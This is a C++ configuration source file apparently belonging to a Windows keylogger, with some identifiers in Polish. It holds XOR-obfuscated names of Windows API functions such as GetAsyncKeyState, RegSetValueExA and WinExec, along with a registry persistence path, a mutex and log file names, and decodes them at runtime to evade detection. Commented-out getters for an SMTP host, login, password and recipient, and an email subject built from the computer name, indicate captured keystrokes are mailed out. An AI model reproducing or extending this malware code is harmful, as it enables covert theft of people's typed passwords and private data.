#include "config.h"

Config::Config()
{
    this->key = "C2fB22yiKAwAgXgTSYYs7AyGmySiqCCumr1Invfkix1177vFR1EODyHsrkiTE8gw";

    this->regKeyDir = "107D201639732B2C170C1E221537143B352D05245E2F1D281A070F2A043131100306672C1C050F0407243E1959";
    this->regKeyName = "0E4B27321E00";
    this->regFilePath = "00083A171D570B1A1711163515210C08173C2A18432E091B06112A051E2424101F5C54910B";
    this->mutexRunKey = "c21f81f31c6d2f4897bce8d4af1d91c2";
    this->timeFileName = "375B0B274046011D";
    this->logFileName = "221C0E36035E";

    this->advapi32Libray = "025610231E5B4A5B65251B2D";
    this->kernel32Libray = "0857142C0B5E4A5B65251B2D";
    this->user32Libray = "164103305D00570D272D";

    this->CopyFileAFunction = "005D163B285B150C0A";
    this->RegOpenKeyExAFunction = "1157010D1E5717222E38323926";
    this->RegSetValueExAFunction = "115701110B462F08273412041F19";
    this->RegCloseKeyFunction = "11570101025D0A0C00240E";
    this->RegDeleteKeyAFuntion = "115701060B5E1C1D2E17165D123D";
    this->WinExecFunction = "145B080716571A";
    this->AsyncKeyStateFunction = "045712031D4B170A00240E1213391331";

    this->xorTmp = new Xor(this->key);
}

/*int Config::GetSendMailTime(){
 * return this->sendMailTime;
 * }
 *
 * string Config::GetHost(){
 * return this->xorTmp->encryptDecrypt(this->host);
 * }
 *
 *string Config::GetLogin(){
 *return this->xorTmp->encryptDecrypt(this->login);
 *}
 *
 *string Config::GetPassword(){
 *return this->xorTmp->encryptDecrypt(this->password);
 *}
 *
 *string Config::GetPort(){
 *return this->xorTmp->encryptDecrypt(this->port);
 *}
 *
 *string Config::GetToMail(){
 *return this->xorTmp->encryptDecrypt(this->toMail);
 *}
 */
string Config::GetKey(){
    return this->key;
}

string Config::GetRegFilePath(){
    return this->xorTmp->encryptDecrypt(this->regFilePath);
}

string Config::GetRegKeyName(){
    return this->xorTmp->encryptDecrypt(this->regKeyName);
}

string Config::GetRegKeyDir(){
    return this->xorTmp->encryptDecrypt(this->regKeyDir);
}

string Config::GetMutexRunKey(){
    return this->mutexRunKey;
}

string Config::GetTimeFileName(){
    return this->xorTmp->encryptDecrypt(this->timeFileName);
}

string Config::GetLogFileName(){
    return this->xorTmp->encryptDecrypt(this->logFileName);
}

string Config::getComputerName(){
    TCHAR nazwaKomputera[MAX_COMPUTERNAME_LENGTH + 2];
    DWORD rozmiar = sizeof (nazwaKomputera) / sizeof (nazwaKomputera[0]);
    GetComputerName(nazwaKomputera, &rozmiar);
    return nazwaKomputera;
}

/*string Config::getEmailSubject(){
 * string temat = "(PKey - [";
 * temat.append(this->getComputerName());
 * temat.append("]) ");
 * return temat;
 * }
 */
LPCTSTR Config::StringToLPCTSTR(string str){
    LPCTSTR lptstrConvertTmp = new TCHAR[str.size() + 1];
    strcpy(lptstrConvertTmp, str.c_str());
    return lptstrConvertTmp;
}

void Config::generateFileConfig(){

}

string Config::GetAsyncKeyStateFunction(){
    return this->xorTmp->encryptDecrypt(this->AsyncKeyStateFunction);
    return this->AsyncKeyStateFunction;
}

string Config::GetCopyFileAFunction(){
    return this->xorTmp->encryptDecrypt(this->CopyFileAFunction);
    return this->CopyFileAFunction;
}

string Config::GetRegCloseKeyFunction(){
    return this->xorTmp->encryptDecrypt(this->RegCloseKeyFunction);
    return this->RegCloseKeyFunction;
}

string Config::GetRegDeleteValueFunction(){
    return this->xorTmp->encryptDecrypt(this->RegDeleteKeyAFuntion);
    return this->RegDeleteKeyAFuntion;
}

string Config::GetRegOpenKeyExAFunction(){
    return this->xorTmp->encryptDecrypt(this->RegOpenKeyExAFunction);
    return RegOpenKeyExAFunction;
}

string Config::GetRegSetValueExAFunction(){
    return this->xorTmp->encryptDecrypt(this->RegSetValueExAFunction);
    return this->RegSetValueExAFunction;
}

string Config::GetWinExecFunction(){
    return this->xorTmp->encryptDecrypt(this->WinExecFunction);
    return this->WinExecFunction;
}

string Config::GetAdvapi32Libray(){
    return this->xorTmp->encryptDecrypt(this->advapi32Libray);
    return this->advapi32Libray;
}

string Config::GetKernel32Libray(){
    return this->xorTmp->encryptDecrypt(this->kernel32Libray);
    return this->kernel32Libray;
}

string Config::GetUser32Libray(){
    return this->xorTmp->encryptDecrypt(this->user32Libray);
    return this->user32Libray;
}
